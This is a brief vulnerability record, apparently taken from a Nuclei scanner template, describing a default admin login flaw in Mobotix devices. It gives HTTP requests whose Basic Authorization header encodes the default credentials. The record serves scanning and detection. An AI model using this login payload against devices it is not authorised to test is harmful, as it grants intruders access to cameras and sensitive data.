# Vulnerability: Mobotix - Default Login
**Classification:** CWE-798
**Source:** Nuclei Template (`mobotix-default-login.yaml`)

## Description
Mobotix contains a default admin login vulnerability. An attacker can obtain access to user accounts and access sensitive information, modify data, and/or execute unauthorized operations.

## Vulnerable Code Pattern / Exploit Payload
```http
GET /control/userimage.html HTTP/1.1
Host: {{Hostname}}

GET /control/userimage.html HTTP/1.1
Host: {{Hostname}}
Authorization: Basic YWRtaW46bWVpbnNt
```

